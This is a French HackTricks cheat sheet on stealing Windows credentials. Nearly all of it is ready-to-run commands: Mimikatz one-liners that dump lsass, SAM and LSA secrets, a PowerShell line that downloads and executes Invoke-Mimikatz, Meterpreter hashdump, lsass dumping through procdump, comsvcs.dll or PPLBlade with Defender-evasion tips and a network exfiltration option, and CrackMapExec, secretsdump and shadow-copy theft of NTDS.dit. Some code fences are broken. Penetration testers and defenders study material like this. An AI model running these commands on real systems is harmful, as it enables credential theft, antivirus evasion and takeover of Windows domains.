# Vol de Credentials Windows

<details>

<summary><strong>Apprenez le hacking AWS de zéro à héros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres moyens de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annoncée dans HackTricks** ou **télécharger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* Découvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-moi** sur **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de hacking en soumettant des PR aux dépôts github** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Credentials Mimikatz
```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```
**Découvrez d'autres fonctionnalités de Mimikatz sur** [**cette page**](credentials-mimikatz.md)**.**

### Invoke-Mimikatz
```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```
[**Apprenez-en plus sur certaines protections possibles des identifiants ici.**](credentials-protections.md) **Ces protections pourraient empêcher Mimikatz d'extraire certains identifiants.**

## Identifiants avec Meterpreter

Utilisez le [**Plugin Credentials**](https://github.com/carlospolop/MSF-Credentials) **que j'ai créé pour rechercher des mots de passe et des hash** à l'intérieur de la victime.
```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```
## Contournement de l'antivirus

### Procdump + Mimikatz

Comme **Procdump de** [**SysInternals**](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite) **est un outil légitime de Microsoft**, il n'est pas détecté par Defender.\
Vous pouvez utiliser cet outil pour **décharger le processus lsass**, **télécharger le déchargement** et **extraire** les **identifiants localement** à partir du déchargement.

{% code title="Décharger lsass" %}
```bash
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```
```
{% endcode %}

{% code title="Extraire les identifiants du dump" %}
```
```c
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```
```markdown
{% endcode %}

Ce processus est effectué automatiquement avec [SprayKatz](https://github.com/aas-n/spraykatz) : `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**Remarque** : Certains **AV** peuvent **détecter** comme **malveillant** l'utilisation de **procdump.exe pour dumper lsass.exe**, car ils **détectent** la chaîne **"procdump.exe" et "lsass.exe"**. Il est donc **plus discret** de **passer** en **argument** le **PID** de lsass.exe à procdump **au lieu du** **nom lsass.exe.**

### Dumping lsass avec **comsvcs.dll**

Il existe une DLL nommée **comsvcs.dll**, située dans `C:\Windows\System32` qui **dumpe la mémoire des processus** lorsqu'ils **plantent**. Cette DLL contient une **fonction** appelée **`MiniDumpW`** qui est écrite pour être appelée avec `rundll32.exe`.\
Les deux premiers arguments ne sont pas utilisés, mais le troisième est divisé en 3 parties. La première partie est l'ID du processus qui sera dumpé, la deuxième partie est l'emplacement du fichier de dump, et la troisième partie est le mot **full**. Il n'y a pas d'autre choix.\
Une fois ces 3 arguments analysés, essentiellement cette DLL crée le fichier de dump, et dumpe le processus spécifié dans ce fichier de dump.\
Grâce à cette fonction, nous pouvons utiliser **comsvcs.dll** pour dumper le processus lsass au lieu de télécharger procdump et de l'exécuter. (Cette information a été extraite de [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords/))
```
```
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```
Nous devons simplement garder à l'esprit que cette technique ne peut être exécutée qu'en tant que **SYSTEM**.

**Vous pouvez automatiser ce processus avec** [**lsassy**](https://github.com/Hackndo/lsassy)**.**

### **Extraire lsass avec le Gestionnaire des tâches**

1. Cliquez avec le bouton droit sur la barre des tâches et cliquez sur Gestionnaire des tâches
2. Cliquez sur Plus de détails
3. Recherchez le processus "Local Security Authority Process" dans l'onglet Processus
4. Cliquez avec le bouton droit sur le processus "Local Security Authority Process" et cliquez sur "Créer un fichier de vidage".

### Extraire lsass avec procdump

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) est un binaire signé par Microsoft qui fait partie de la suite [sysinternals](https://docs.microsoft.com/en-us/sysinternals/).
```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```
## Vol de données lsass avec PPLBlade

[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) est un outil de vidage de processus protégés qui prend en charge l'obfuscation de vidage de mémoire et son transfert sur des postes de travail distants sans l'écrire sur le disque.

**Fonctionnalités clés** :

1. Contournement de la protection PPL
2. Obfuscation des fichiers de vidage de mémoire pour éviter la détection basée sur les signatures de Defender
3. Téléversement du vidage de mémoire avec les méthodes RAW et SMB sans l'écrire sur le disque (vidage sans fichier)

{% code overflow="wrap" %}
```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```
{% endcode %}

## CrackMapExec

### Extraire les hachages SAM
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```
### Extraire les secrets LSA
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```
### Extraire le fichier NTDS.dit du contrôleur de domaine cible
```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```
### Extraire l'historique des mots de passe NTDS.dit du contrôleur de domaine cible
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```
### Afficher l'attribut pwdLastSet pour chaque compte NTDS.dit
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```
## Vol de SAM & SYSTEM

Ces fichiers doivent se trouver dans _C:\windows\system32\config\SAM_ et _C:\windows\system32\config\SYSTEM._ Mais **vous ne pouvez pas simplement les copier de manière classique** car ils sont protégés.

### Depuis le Registre

La manière la plus simple de voler ces fichiers est d'obtenir une copie depuis le registre :
```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```
**Téléchargez** ces fichiers sur votre machine Kali et **extraites les hachages** en utilisant :
```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```
### Copie de l'ombre de volume

Vous pouvez effectuer une copie de fichiers protégés en utilisant ce service. Vous devez être Administrateur.

#### Utilisation de vssadmin

Le binaire vssadmin est uniquement disponible dans les versions de Windows Server
```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```
Mais vous pouvez faire la même chose depuis **Powershell**. Voici un exemple de **comment copier le fichier SAM** (le disque dur utilisé est "C:" et il est sauvegardé dans C:\users\Public) mais vous pouvez utiliser ceci pour copier n'importe quel fichier protégé :
```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
$voume.Delete();if($notrunning -eq 1){$service.Stop()}
```
### Invoke-NinjaCopy

Finalement, vous pourriez également utiliser le [**script PS Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) pour faire une copie de SAM, SYSTEM et ntds.dit.
```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```
## **Identifiants Active Directory - NTDS.dit**

**Le fichier Ntds.dit est une base de données qui stocke les données Active Directory**, y compris les informations sur les objets utilisateur, les groupes et l'appartenance aux groupes. Il comprend les hachages de mot de passe pour tous les utilisateurs du domaine.

Le fichier NTDS.dit important se trouvera **dans** : _%SystemRoom%/NTDS/ntds.dit_\
Ce fichier est une base de données _Extensible Storage Engine_ (ESE) et est "officiellement" composé de 3 tables :

* **Table de données** : Contient les informations sur les objets (utilisateurs, groupes...)
* **Table de liens** : Informations sur les relations (membre de...)
* **Table SD** : Contient les descripteurs de sécurité de chaque objet

Plus d'informations à ce sujet : [http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)

Windows utilise _Ntdsa.dll_ pour interagir avec ce fichier et il est utilisé par _lsass.exe_. Ensuite, **une partie** du fichier **NTDS.dit** pourrait se trouver **à l'intérieur de la mémoire `lsass`** (vous pouvez trouver les données les plus récemment accédées probablement en raison de l'amélioration des performances en utilisant un **cache**).

#### Décryptage des hachages dans NTDS.dit

Le hachage est chiffré 3 fois :

1. Décrypter la clé de chiffrement de mot de passe (**PEK**) en utilisant le **BOOTKEY** et **RC4**.
2. Décrypter le **hachage** en utilisant **PEK** et **RC4**.
3. Décrypter le **hachage** en utilisant **DES**.

**PEK** a la **même valeur** dans **chaque contrôleur de domaine**, mais il est **chiffré** à l'intérieur du fichier **NTDS.dit** en utilisant le **BOOTKEY** du **fichier SYSTEM du contrôleur de domaine (qui est différent entre les contrôleurs de domaine)**. C'est pourquoi pour obtenir les identifiants à partir du fichier NTDS.dit **vous avez besoin des fichiers NTDS.dit et SYSTEM** (_C:\Windows\System32\config\SYSTEM_).

### Copie de NTDS.dit en utilisant Ntdsutil

Disponible depuis Windows Server 2008.
```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```
Vous pouvez également utiliser l'astuce de la [**copie de l'ombre de volume**](./#stealing-sam-and-system) pour copier le fichier **ntds.dit**. N'oubliez pas que vous aurez également besoin d'une copie du **fichier SYSTEM** (encore une fois, [**l'extraire du registre ou utiliser l'astuce de la copie de l'ombre de volume**](./#stealing-sam-and-system)).

### **Extraire les hachages de NTDS.dit**

Une fois que vous avez **obtenu** les fichiers **NTDS.dit** et **SYSTEM**, vous pouvez utiliser des outils comme _secretsdump.py_ pour **extraire les hachages** :
```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```
Vous pouvez également **les extraire automatiquement** en utilisant un utilisateur admin de domaine valide :
```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```
### **Extraction d'objets de domaine à partir de NTDS.dit vers une base de données SQLite**

Les objets NTDS peuvent être extraits vers une base de données SQLite avec [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite). Non seulement les secrets sont extraits, mais également l'ensemble des objets et leurs attributs pour une extraction d'informations plus poussée lorsque le fichier NTDS.dit brut est déjà récupéré.
```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```
```markdown
Le `SYSTEM` hive est optionnel mais permet le déchiffrement de secrets (hashes NT & LM, informations d'identification supplémentaires telles que les mots de passe en clair, les clés kerberos ou de confiance, historiques de mots de passe NT & LM). En plus d'autres informations, les données suivantes sont extraites : comptes utilisateurs et machines avec leurs hashes, indicateurs UAC, horodatage de la dernière connexion et du changement de mot de passe, description des comptes, noms, UPN, SPN, groupes et appartenances récursives, arborescence et appartenance des unités organisationnelles, domaines de confiance avec type, direction et attributs de confiance...

## Lazagne

Téléchargez le binaire depuis [ici](https://github.com/AlessandroZ/LaZagne/releases). Vous pouvez utiliser ce binaire pour extraire les informations d'identification de plusieurs logiciels.
```
```
lazagne.exe all
```
## Autres outils pour extraire les identifiants de SAM et LSASS

### Windows credentials Editor (WCE)

Cet outil peut être utilisé pour extraire les identifiants de la mémoire. Téléchargez-le depuis : [http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

Extrait les identifiants du fichier SAM
```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```
### PwDump

Extraire les identifiants du fichier SAM
```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```
### PwDump7

Téléchargez-le depuis : [http://www.tarasco.org/security/pwdump\_7](http://www.tarasco.org/security/pwdump\_7) et **exécutez-le** simplement et les mots de passe seront extraits.

## Défenses

[**Apprenez certaines protections des identifiants ici.**](credentials-protections.md)

<details>

<summary><strong>Apprenez le piratage AWS de zéro à héros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres moyens de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annoncée dans HackTricks** ou **télécharger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* Découvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-moi** sur **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux dépôts github** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
